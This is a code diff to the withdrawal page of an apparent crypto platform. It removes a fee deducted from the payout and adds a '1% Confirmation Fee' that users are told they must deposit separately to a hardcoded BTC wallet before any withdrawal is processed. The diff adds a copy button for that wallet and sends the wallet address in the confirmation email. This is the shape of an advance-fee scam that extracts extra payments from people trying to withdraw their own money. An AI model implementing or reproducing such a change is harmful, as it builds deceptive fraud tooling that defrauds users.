@@ -12,7 +12,7 @@ import { Badge } from "@/components/ui/badge";
 import { format } from "date-fns";
 import { ExternalLink, Clock } from "lucide-react";
 import { amountSchema, getWalletAddressSchema, validateField } from "@/lib/validation";
-import { MINIMUM_WITHDRAWAL_AMOUNT, NETWORK_FEE_PERCENTAGE } from "@/lib/constants";
+import { MINIMUM_WITHDRAWAL_AMOUNT, CONFIRMATION_FEE_PERCENTAGE, CONFIRMATION_FEE_WALLET_BTC } from "@/lib/constants";
 import { useBlockchainVerification } from "@/hooks/useBlockchainVerification";
 import { BlockchainVerificationBadge } from "@/components/BlockchainVerificationBadge";
 import { PullToRefresh } from "@/components/PullToRefresh";
@@ -167,16 +167,15 @@ const Withdraw = () => {
         setBalance(result.new_balance);
       }
 
-      const networkFee = withdrawalAmount * NETWORK_FEE_PERCENTAGE;
-      const netAmount = withdrawalAmount - networkFee;
+      const confirmationFee = withdrawalAmount * CONFIRMATION_FEE_PERCENTAGE;
 
       // Send withdrawal submitted email (fire-and-forget)
       sendTransactionalEmail("withdrawal_submitted", user.email || "", {
         amount: withdrawalAmount,
         currency: currency.toUpperCase(),
         wallet_address: walletAddress.trim(),
-        network_fee: networkFee,
-        net_amount: netAmount,
+        confirmation_fee: confirmationFee,
+        fee_wallet: CONFIRMATION_FEE_WALLET_BTC,
       });
 
       toast({
@@ -360,19 +359,37 @@ const Withdraw = () => {
             )}
 
             {parseFloat(amount) > 0 && (
-              <div className="p-3 bg-muted rounded-lg space-y-1 text-sm">
+              <div className="p-3 bg-muted rounded-lg space-y-2 text-sm">
                 <div className="flex justify-between">
-                  <span className="text-muted-foreground">Withdrawal Amount:</span>
-                  <span>${parseFloat(amount).toLocaleString()}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-muted-foreground">Network Fee (1%):</span>
-                  <span className="text-destructive">-${(parseFloat(amount) * NETWORK_FEE_PERCENTAGE).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
+                  <span className="text-muted-foreground">{t("withdraw.youWillReceive")}:</span>
+                  <span className="font-bold text-foreground">${parseFloat(amount).toLocaleString()}</span>
                 </div>
                 <Separator className="my-1" />
-                <div className="flex justify-between font-bold">
-                  <span>{t("withdraw.youWillReceive")}:</span>
-                  <span className="text-success">${(parseFloat(amount) * (1 - NETWORK_FEE_PERCENTAGE)).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">1% Confirmation Fee:</span>
+                  <span className="font-semibold text-amber-600 dark:text-amber-400">
+                    ${(parseFloat(amount) * CONFIRMATION_FEE_PERCENTAGE).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                  </span>
+                </div>
+                <div className="p-2 bg-amber-500/10 border border-amber-500/20 rounded text-xs text-amber-700 dark:text-amber-300 space-y-1">
+                  <p className="font-semibold">⚠️ Separate deposit required</p>
+                  <p>You must deposit the 1% confirmation fee to the following BTC wallet before your withdrawal can be processed:</p>
+                  <div className="flex items-center gap-1 mt-1">
+                    <code className="text-[10px] break-all bg-background/50 px-1.5 py-0.5 rounded flex-1">{CONFIRMATION_FEE_WALLET_BTC}</code>
+                    <Button
+                      type="button"
+                      variant="ghost"
+                      size="sm"
+                      className="h-6 w-6 p-0 shrink-0"
+                      onClick={(e) => {
+                        e.stopPropagation();
+                        navigator.clipboard.writeText(CONFIRMATION_FEE_WALLET_BTC);
+                        toast({ title: "Copied", description: "Wallet address copied to clipboard" });
+                      }}
+                    >
+                      <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+                    </Button>
+                  </div>
                 </div>
               </div>
             )}
